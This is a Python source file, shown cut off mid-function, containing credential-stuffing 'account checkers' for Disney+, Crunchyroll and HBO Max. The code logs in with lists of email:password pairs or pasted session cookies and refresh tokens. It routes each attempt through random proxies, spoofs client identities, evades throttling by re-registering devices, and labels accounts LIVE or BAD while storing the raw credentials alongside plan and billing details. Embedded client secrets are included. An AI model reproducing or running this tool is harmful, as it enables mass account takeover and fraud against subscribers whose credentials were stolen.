DISNEY_PUBLIC_GQL = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
DISNEY_TOKEN_URL = "https://disney.api.edge.bamgrid.com/token"
DISNEY_IDP_LOGIN = "https://disney.api.edge.bamgrid.com/idp/login"
DISNEY_ACCOUNTS_GRANT = "https://disney.api.edge.bamgrid.com/accounts/grant"
DISNEY_ACCOUNTS_ME = "https://disney.api.edge.bamgrid.com/accounts/me"
DISNEY_SUBSCRIBERS = "https://disney.api.edge.bamgrid.com/v2/subscribers"
DISNEY_SUBSCRIPTIONS = "https://disney.api.edge.bamgrid.com/subscriptions"

DISNEY_BAMSDK_VERSION = "35.2"

DISNEY_BASE_HDRS = {
    "Accept": "application/json; charset=utf-8",
    "Content-Type": "application/json; charset=utf-8",
    "X-BAMSDK-Platform-Id": "browser",
    "X-BAMSDK-Client-Id": DISNEY_CLIENT_ID,
    "X-BAMSDK-Version": DISNEY_BAMSDK_VERSION,
    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.disneyplus.com",
    "Referer": "https://www.disneyplus.com/",
    "Accept-Language": "en-US,en;q=0.9",
}

DISNEY_REGISTER_MUTATION = """mutation registerDevice($input: RegisterDeviceInput!) {
  registerDevice(registerDevice: $input) {
    grant { grantType assertion }
  }
}"""

DISNEY_LOGIN_MUTATION = "mutation login($input: LoginInput!) { login(login: $input) { actionGrant } }"

DISNEY_LOGIN_AG_MUTATION = (
    "mutation loginWithActionGrant($input: LoginWithActionGrantInput!) {"
    " loginWithActionGrant(login: $input) {"
    "   token { accessToken refreshToken }"
    "   activeSession { sessionId }"
    " }"
    "}"
)

DISNEY_REGISTER_INPUT = {
    "applicationRuntime": "chrome",
    "attributes": {
        "browserName": "chrome",
        "browserVersion": "124.0.0.0",
        "manufacturer": "apple",
        "model": None,
        "operatingSystem": "macintosh",
        "operatingSystemVersion": "10.15.7",
        "osDeviceIds": [],
    },
    "deviceFamily": "browser",
    "deviceLanguage": "en-US",
    "deviceProfile": "macosx",
}


def _disney_make_opener(proxy_url):
    if proxy_url:
        ph = urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
        return urllib.request.build_opener(ph)
    return urllib.request.build_opener()


def _disney_gql(opener, url, query, variables, op, auth, timeout=20):
    payload = json.dumps({"query": query, "variables": variables, "operationName": op}).encode()
    req = urllib.request.Request(url, data=payload,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_post_json(opener, url, body, auth, timeout=20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body_j = json.loads(e.read() or b"{}")
        except Exception:
            body_j = {}
        return e.code, body_j
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_token_form(opener, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(DISNEY_TOKEN_URL, data=data,
                                headers={**DISNEY_BASE_HDRS,
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "Authorization": f"Bearer {DISNEY_API_KEY}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return {"_error": e.code, **body}
    except Exception as exc:
        return {"_exc": str(exc)}


def _disney_get_json(opener, url, auth, timeout=20):
    req = urllib.request.Request(url, headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _disney_fresh_device_token(opener, timeout=20):
    s, r = _disney_gql(opener, DISNEY_DEVICE_GQL, DISNEY_REGISTER_MUTATION,
                       {"input": DISNEY_REGISTER_INPUT}, "registerDevice", DISNEY_API_KEY, timeout)
    if s != 200 or not (r.get("data") or {}).get("registerDevice"):
        raise RuntimeError(f"registerDevice failed {s}: {r}")
    assertion = r["data"]["registerDevice"]["grant"]["assertion"]
    tok = _disney_token_form(opener, {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }, timeout)
    if "access_token" not in tok:
        raise RuntimeError(f"Device token exchange failed: {tok}")
    return tok["access_token"]


def _disney_err_code(e):
    return (e.get("code") or e.get("extensions", {}).get("code") or "").lower()


def _disney_is_throttled(errors):
    return any("throttled" in _disney_err_code(e) for e in errors)


def _disney_is_bad_creds(errors, http_status):
    bad_fragments = ("bad-credentials", "not-found", "user-disabled",
                     "identity.bad-credentials", "invalid-credentials", "identity.not-found")
    for e in errors:
        code = _disney_err_code(e)
        if any(f in code for f in bad_fragments):
            return True
    return http_status == 401


def _disney_get_country(me):
    attrs = me.get("attributes", {})
    purchase = attrs.get("locations", {}).get("purchase", {})
    if purchase.get("country"):
        return purchase["country"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "dss_country_code" and elem.get("value"):
            return elem["value"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "ot_country_code" and elem.get("value"):
            return elem["value"].upper()
    reg = attrs.get("locations", {}).get("registration", {})
    geoip = reg.get("geoIp", {})
    if geoip.get("country"):
        return geoip["country"].upper()
    return "N/A"


def _disney_get_active_sub(subscriptions):
    for s in subscriptions:
        state = s.get("state", "")
        if state == "ACTIVE":
            return s
        status = (s.get("status") or {}).get("type", "")
        if status == "SUBSCRIBED" or s.get("isActive"):
            return s
    return {}


def _disney_get_renewal_date(subscriptions_raw):
    active_s = [s for s in subscriptions_raw if s.get("isActive")]
    all_s = active_s or subscriptions_raw
    for s in all_s:
        nrd = s.get("nextRenewalDate")
        if nrd:
            return nrd[:10]
    return "N/A"


def check_disney_account(email, password, use_proxy=True):
    """Check a Disney+ account. Returns dict with status/details."""
    proxy_url = None
    proxy_label = "Direct"
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            # pick the http value
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"

    opener = _disney_make_opener(proxy_url)
    timeout = 20

    # Step 1-2: device registration
    try:
        dev_tok = _disney_fresh_device_token(opener, timeout)
    except Exception as exc:
        save_history("disney", "ERROR", route=f"Proxy ({proxy_label})" if use_proxy else "Direct",
                     raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"device-token: {exc}", "route": proxy_label}

    # Step 3: login
    id_tok = None
    max_retries = 3
    for attempt in range(1, max_retries + 1):
        s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_MUTATION,
                           {"input": {"email": email, "password": password}},
                           "login", dev_tok, timeout)
        errors = r.get("errors", [])

        if s == 200 and not errors:
            action_grant = (r.get("data") or {}).get("login", {}).get("actionGrant")
            if action_grant:
                id_tok = action_grant
                break

        if _disney_is_throttled(errors):
            s2, r2 = _disney_post_json(opener, DISNEY_IDP_LOGIN,
                                       {"email": email, "password": password}, dev_tok, timeout)
            errors2 = r2.get("errors", [])
            if s2 == 200 and "id_token" in r2:
                id_tok = r2["id_token"]
                break
            if _disney_is_throttled(errors2):
                if attempt < max_retries:
                    time.sleep(5 * attempt)
                    try:
                        dev_tok = _disney_fresh_device_token(opener, timeout)
                    except Exception:
                        pass
                    continue
                save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "ERROR", "reason": f"Throttled after {attempt} attempts", "route": proxy_label}
            if _disney_is_bad_creds(errors2, s2):
                save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}
            desc = (errors2[0].get("description", "") or _disney_err_code(errors2[0]) if errors2 else "")
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": desc or f"idp/login HTTP {s2}", "route": proxy_label}

        if _disney_is_bad_creds(errors, s):
            save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}

        desc = (_disney_err_code(errors[0]) if errors else "")
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": desc or f"gql-login HTTP {s}", "route": proxy_label}

    if not id_tok:
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": "Login: no id_token", "route": proxy_label}

    # Step 4: account token
    acc_tok = None
    s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_AG_MUTATION,
                       {"input": {"actionGrant": id_tok}},
                       "loginWithActionGrant", dev_tok, timeout)
    ag_data = (r.get("data") or {}).get("loginWithActionGrant", {})
    gql_acc_tok = (ag_data.get("token") or {}).get("accessToken")

    if s == 200 and gql_acc_tok:
        acc_tok = gql_acc_tok
    else:
        s2, r2 = _disney_post_json(opener, DISNEY_ACCOUNTS_GRANT, {"id_token": id_tok}, dev_tok, timeout)
        if s2 != 200 or "assertion" not in r2:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"accounts/grant HTTP {s2}", "route": proxy_label}
        tok2 = _disney_token_form(opener, {
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": r2["assertion"],
            "subject_token_type": "urn:bamtech:params:oauth:token-type:account",
            "latitude": "0", "longitude": "0", "platform": "browser",
        }, timeout)
        acc_tok = tok2.get("access_token")
        if not acc_tok:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"account token failed", "route": proxy_label}

    # Step 5: /accounts/me
    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    # Step 6: /v2/subscribers
    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
    if s_subs != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    # Step 7: /subscriptions
    subscriptions_raw = []
    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    # Extract info
    attrs = me.get("attributes", {})
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country = _disney_get_country(me)
    country_name = normalize_country(country) if len(country) == 2 else country

    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
    v2_subs = v2.get("subscriptions", [])
    active = _disney_get_active_sub(v2_subs)

    if active:
        product = active.get("product", {})
        plan_name = product.get("name") or "Disney Plus"
        term = active.get("term", {})
        is_trial = term.get("isFreeTrial", False)
        has_plan = True
        status = "LIVE"
    else:
        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
        is_trial = False
        has_plan = False
        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"

    renewal = _disney_get_renewal_date(subscriptions_raw)

    # Save to history
    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    save_history("disney", status, plan=plan_name, billing=renewal,
                 country=country_name, route=route,
                 raw_cookie=f"{email}:{password}", email=email)

    return {
        "status": status,
        "email": email,
        "email_verified": email_verified,
        "country": country_name,
        "plan": plan_name,
        "free_trial": is_trial,
        "renewal_date": renewal,
        "subscriber_status": subscriber_status,
        "has_plan": has_plan,
        "route": route,
    }


# ══════════════════════════════════════════════════════════════════════════════
# Crunchyroll Account Checker (Android API reverse-engineered flow)
# ══════════════════════════════════════════════════════════════════════════════

CR_AUTH_BASIC = "Basic YWJvdGxoMXdlcTByNGxudm5haHo6dWlLSjJqUXRVX0FQYzdZa0hqSWlDTFoyMjhnbGxOY2o="
CR_AUTH_FALLBACK = "Basic dC1rZGdwMmg4YzNqdWI4Zm4wZnE6eWZMRGZNZnJZdktYaDRKWFMxTEVJMmNDcXUxdjVXYW4="

def check_crunchyroll_account(email, password, use_proxy=True):
    """Check a Crunchyroll account: login → profile → subscription."""
    import uuid as _uuid
    route = "Direct"
    proxies = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]   # {"http": ..., "https": ...}
            route = proxy_result[1]     # "ip:port (latency)"

    session = requests.Session()
    session.verify = False

    android_ver = str(random.randint(13, 15))
    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"

    session.headers.update({
        "Authorization": CR_AUTH_BASIC,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "Connection": "Keep-Alive",
        "etp-anonymous-id": str(_uuid.uuid4()),
        "x-datadog-sampling-priority": "0",
    })

    if proxies:
        session.proxies = proxies

    # Step 1: Login
    try:
        login_data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": str(_uuid.uuid4()),
            "device_name": "sdk_gphone64_x86_64",
            "device_type": "Google sdk_gphone64_x86_64",
        }
        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)

        # Fallback to alternate auth token if client_inactive
        if r.status_code == 401 and "client_inactive" in r.text:
            session.headers["Authorization"] = CR_AUTH_FALLBACK
            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)

        if r.status_code == 401:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
        if r.status_code == 403:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
        if r.status_code == 429:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
        if r.status_code == 500:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Server error: {r.text[:100]}", "route": route}
        if r.status_code != 200:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Login failed ({r.status_code})", "route": route}

        jwt = r.json().get("access_token")
        if not jwt:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "No access token returned", "route": route}

        session.headers["Authorization"] = f"Bearer {jwt}"
    except requests.exceptions.RequestException as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}

    # Step 2: Get account info (external_id, email, country)
    external_id = None
    username = ""
    cr_email = email
    email_verified = False
    country = ""
    created = ""
    avatar = ""
    preferred_lang = ""
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
        if r.status_code == 200:
            me = r.json()
            external_id = me.get("external_id")
            cr_email = me.get("email", email)
            email_verified = me.get("email_verified", False)
            created = me.get("created", "")
        else:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
    except Exception as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}

    # Step 2b: Get profile (profile_name, avatar, country from maturity_rating)
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
        if r.status_code == 200:
            prof = r.json()
            username = prof.get("username", "") or prof.get("profile_name", "")
            avatar = prof.get("avatar", "")
            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
            ext_ratings = prof.get("extended_maturity_rating", {})
            if ext_ratings:
                country = next(iter(ext_ratings.keys()), "")
    except Exception:
        pass

    # Step 3: Get multiprofile count
    num_profiles = 1
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
        if r.status_code == 200:
            profiles = r.json().get("profiles", [])
            num_profiles = len(profiles)
    except Exception:
        pass

    # Step 4: Check subscription (benefits + products for full detail)
    subscription = "Free"
    sub_source = ""
    sub_country = ""
    sub_benefits = []
    concurrent_streams = 1
    has_ads = True
    offline_viewing = False
    sub_product_name = ""
    sub_cycle = ""
    sub_effective_date = ""
    is_cancelled = False
    active_free_trial = False
    try:
        if external_id:
            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
            if r.status_code == 200:
                data = r.json()
                items = data.get("items", [])
                total_items = data.get("total", 0)
                sub_country = data.get("subscription_country", "")
                sub_benefits = [item.get("benefit", "") for item in items]
                if items:
                    sub_source = items[0].get("source", "")

                # Parse concurrent streams
                for b in sub_benefits:
                    if b.startswith("concurrent_streams."):
                        try: concurrent_streams = int(b.split(".")[-1])
                        except: pass
                has_ads = "no_ads" not in sub_benefits
                offline_viewing = "offline_viewing" in sub_benefits

                if total_items > 0:
                    if "cr_mega_pack" in sub_benefits:
                        subscription = "Mega Pack"
                    elif "cr_fan_pack" in sub_benefits:
                        subscription = "Fan Pack"
                    elif "cr_premium" in sub_benefits:
                        subscription = "Premium"
                    elif "catalog" in sub_benefits:
                        subscription = "Basic"
                    else:
                        subscription = "Unknown Premium"
                else:
                    subscription = "Free"
            elif r.status_code == 404:
                subscription = "Free"

            # Get product details (billing cycle, cancel status, trial)
            try:
                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
                if r2.status_code == 200:
                    prod_data = r2.json()
                    prod_items = prod_data.get("items", [])
                    if prod_items:
                        prod = prod_items[0]
                        is_cancelled = prod.get("is_cancelled", False)
                        active_free_trial = prod.get("active_free_trial", False)
                        sub_effective_date = prod.get("effective_date", "")
                        product_info = prod.get("product", {})
                        sub_product_name = product_info.get("sku", "")
                        cycle_raw = product_info.get("cycle_duration", "")
                        # Parse ISO 8601 duration: P1M = Monthly, P1Y = Yearly, P7D = Weekly
                        if cycle_raw == "P1M": sub_cycle = "Monthly"
                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
                        else: sub_cycle = cycle_raw
            except Exception:
                pass
    except Exception:
        pass

    session.close()

    status = "LIVE" if subscription != "Free" else "FREE"

    result = {
        "status": status,
        "email": cr_email,
        "email_verified": email_verified,
        "username": username,
        "country": country.upper() if country else "",
        "subscription": subscription,
        "profiles": num_profiles,
        "external_id": external_id,
        "created": created,
        "route": route,
        # Subscription details
        "sub_country": sub_country,
        "sub_source": sub_source,
        "sub_cycle": sub_cycle,
        "concurrent_streams": concurrent_streams,
        "has_ads": has_ads,
        "offline_viewing": offline_viewing,
        "is_cancelled": is_cancelled,
        "active_free_trial": active_free_trial,
        "sub_effective_date": sub_effective_date,
        "avatar": avatar,
    }

    # Save to history
    plan_str = f"Crunchyroll {subscription}"
    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
                 route=route, raw_cookie=f"{email}:{password}", email=email)

    return result


# ══════════════════════════════════════════════════════════════════════════════
# HBO Max (Max) Account Checker (Comet API reverse-engineered flow)
# ══════════════════════════════════════════════════════════════════════════════

import uuid as _uuid_mod
import base64

HBO_CLIENT_ID = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
HBO_CLIENT_SECRET = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
HBO_TOKEN_URL = "https://comet.api.hbo.com/tokens"

HBO_BASE_HDRS = {
    "X-Hbo-Client-Version": "Hadron/50.3.0.362",
    "Accept": "application/vnd.hbo.v9.full+json",
    "Content-Type": "application/json",
    "X-Hbo-Device-Name": "desktop",
    "X-Hbo-Device-Os-Version": "undefined",
    "Origin": "https://play.max.com",
    "Referer": "https://play.max.com/",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}


def _hbo_decode_jwt(token):
    """Decode the middle segment of a JWT (base64url) and return the payload dict."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        # Fix padding
        payload += "=" * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return {}


def check_hbomax_token(token_text, use_proxy=True):
    """Check an HBO Max / Max account via access_token, refresh_token, or Netscape cookie jar.
    Accepts: raw JWT access_token, refresh_token, 'access_token=...' format, or Netscape cookie format."""
    proxy_url = None
    proxy_label = "Direct"
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"

    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    token_text = token_text.strip()
    # Strip comment lines ($ prefixed lines from dump files)
    cleaned_lines = [l for l in token_text.split("\n") if l.strip() and not l.strip().startswith("$") and not l.strip().startswith("#") and l.strip() != "=" * len(l.strip())]
    cleaned_text = "\n".join(cleaned_lines).strip()

    access_token = ""
    refresh_token = ""
    cookie_profile_id = ""
    cookie_country = ""
    cookie_session_info = ""
    input_format = "unknown"

    # --- Detect Netscape cookie format (tab-separated, domain starts with . or hostname) ---
    is_netscape = False
    netscape_cookies = {}
    for line in cleaned_lines:
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            is_netscape = True
            domain = parts[0].strip()
            name = parts[5].strip()
            value = parts[6].strip()
            netscape_cookies[name] = value

    if is_netscape and netscape_cookies:
        input_format = "netscape_cookies"
        # Extract the st cookie (JWT access token from FPA issuer)
        st_token = netscape_cookies.get("st", "")
        if st_token and st_token.count(".") == 2:
            access_token = st_token

        # Extract useful metadata from cookies
        cookie_country = netscape_cookies.get("countryCode", "") or netscape_cookies.get("usr_country", "")

        # Extract profileId from wbd-profile-context cookie
        wbd_ctx = netscape_cookies.get("wbd-profile-context", "")
        if wbd_ctx:
            try:
                ctx_data = json.loads(wbd_ctx)
                cookie_profile_id = ctx_data.get("profileId", "")
            except Exception:
                pass

        # Extract session info
        session_ck = netscape_cookies.get("session", "")
        if session_ck:
            try:
                sess_data = json.loads(session_ck)
                if sess_data.get("expires"):
                    from datetime import datetime as _dt
                    cookie_session_info = _dt.fromtimestamp(sess_data["expires"] / 1000).strftime("%Y-%m-%d %H:%M:%S") if sess_data["expires"] > 1e10 else _dt.fromtimestamp(sess_data["expires"]).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                pass

        if not access_token:
            # No st cookie — look for any JWT in cookie values
            for ck_name, ck_val in netscape_cookies.items():
                if ck_val.startswith("eyJ") and ck_val.count(".") == 2:
                    access_token = ck_val
                    break

    if not is_netscape:
        # --- Try key=value parsing ---
        for line in cleaned_text.replace(";", "\n").replace("&", "\n").split("\n"):
            line = line.strip()
            if "=" in line:
                k, v = line.split("=", 1)
                k = k.strip().lower()
                v = v.strip()
                if k == "access_token":
                    access_token = v
                    input_format = "key_value"
                elif k == "refresh_token":
                    refresh_token = v
                    input_format = "key_value"

        # If no key=value found, check if it's a raw JWT or plain token
        if not access_token and not refresh_token:
            if cleaned_text.count(".") == 2 and cleaned_text.startswith("eyJ"):
                access_token = cleaned_text
                input_format = "jwt"
            elif len(cleaned_text) > 20:
                refresh_token = cleaned_text
                input_format = "refresh_token"

    # If we have a refresh_token but no access_token, exchange it
    if refresh_token and not access_token:
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(HBO_BASE_HDRS)
            if proxies:
                session.proxies = proxies

            device_serial = str(_uuid_mod.uuid4())
            step1_body = {
                "client_id": HBO_CLIENT_ID,
                "client_secret": HBO_CLIENT_SECRET,
                "scope": "browse video_playback_free",
                "grant_type": "client_credentials",
                "deviceSerialNumber": device_serial,
                "clientDeviceData": {"paymentProviderCode": "blackmarket"}
            }
            r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)
            if r1.status_code != 200:
                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
                return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route, "mode": "token", "input_format": input_format}
            client_token = r1.json().get("access_token", "")

            session.headers["Authorization"] = f"Bearer {client_token}"
            refresh_body = {
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": "browse video_playback device elevated_account_management"
            }
            r2 = session.post(HBO_TOKEN_URL, json=refresh_body, timeout=20)
            r2_text = r2.text.lower()

            if r2.status_code == 403 or "geo" in r2_text:
                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
                return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route, "mode": "token", "input_format": input_format}

            if r2.status_code in (401, 400) or "invalid" in r2_text or "expired" in r2_text:
                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
                return {"status": "DEAD", "reason": "Token expired atau tidak valid", "route": route, "mode": "token", "input_format": input_format}

            r2_data = r2.json()
            access_token = r2_data.get("access_token", "")
            if not access_token:
                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
                return {"status": "DEAD", "reason": "Refresh gagal — tidak ada access_token baru", "route": route, "mode": "token", "input_format": input_format}

            session.close()
        except requests.exceptions.RequestException as e:
            save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
            return {"status": "ERROR", "reason": f"Refresh request gagal: {str(e)[:100]}", "route": route, "mode": "token", "input_format": input_format}

    if not access_token:
        save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
        return {"status": "ERROR", "reason": "Tidak ada access_token, st cookie, atau refresh_token yang valid", "route": route, "mode": "token", "input_format": input_format}

    # Decode JWT payload
    jwt_payload = _hbo_decode_jwt(access_token)

    # Check if token is expired
    exp_ts = jwt_payload.get("exp", 0)
    import time as _time_mod
    if exp_ts and exp_ts < _time_mod.time():
        if not refresh_token:
            save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
            return {"status": "DEAD", "reason": "Access token sudah expired. Paste refresh_token untuk renew.", "route": route, "mode": "token", "input_format": input_format}

    # Extract subscription info from JWT
    jwt_sub = jwt_payload.get("sub", "")
    email = jwt_payload.get("email", "") or ""
    # Parse USERID from sub field (e.g., "USERID:bolt:e27c1e8d-...")
    user_id = ""
    if jwt_sub.startswith("USERID:"):
        user_id = jwt_sub.split(":", 2)[-1] if jwt_sub.count(":") >= 2 else jwt_sub
    else:
        user_id = jwt_payload.get("userId", "") or jwt_payload.get("profileId", "") or jwt_sub

    sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
    country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or cookie_country or ""
    entitlements = jwt_payload.get("entitlements", []) or []
    service_code = jwt_payload.get("serviceCode", "") or ""
    product_code = jwt_payload.get("productCode", "") or ""
    token_type = jwt_payload.get("type", "") or ""
    subdivision = jwt_payload.get("subdivision", "") or ""
    device_id = jwt_payload.get("deviceId", "") or ""
    is_anonymous = jwt_payload.get("anonymous", True)
    profile_id = cookie_profile_id or jwt_payload.get("profileId", "") or ""

    # Determine plan — try API call first for FPA tokens (they don't carry subscription info in JWT)
    plan = ""
    profiles_count = 0
    api_subscription = {}

    # Use st token to query comet API for actual subscription/entitlements
    try:
        val_session = requests.Session()
        val_session.verify = False
        val_session.headers.update(HBO_BASE_HDRS)
        val_session.headers["Authorization"] = f"Bearer {access_token}"
        if proxies:
            val_session.proxies = proxies

        # Try to get user & subscription info from sessions/active endpoint
        # This uses the comet API to check entitlements
        sessions_url = "https://comet.api.hbo.com/sessions"
        sr = val_session.get(sessions_url, timeout=15)
        if sr.status_code == 200:
            sr_data = sr.json()
            # Extract subscription details from session response
            if isinstance(sr_data, dict):
                for key in ("subscriptionTier", "tier", "package", "productCode"):
                    if sr_data.get(key):
                        sub_tier = sub_tier or str(sr_data[key])
                # Check for entitlements array
                ent = sr_data.get("entitlements", [])
                if ent:
                    entitlements = ent

        # Try profiles endpoint
        pr = val_session.get("https://profiles.api.hbo.com/profiles", timeout=10)
        if pr.status_code == 200:
            pr_data = pr.json()
            if isinstance(pr_data, list):
                profiles_count = len(pr_data)
                # Try to find email from profile
                for p in pr_data:
                    if isinstance(p, dict):
                        em = p.get("email", "") or p.get("emailAddress", "")
                        if em:
                            email = email or em
                            break
            elif isinstance(pr_data, dict):
                profiles_list = pr_data.get("profiles", pr_data.get("items", []))
                profiles_count = len(profiles_list)
                for p in profiles_list:
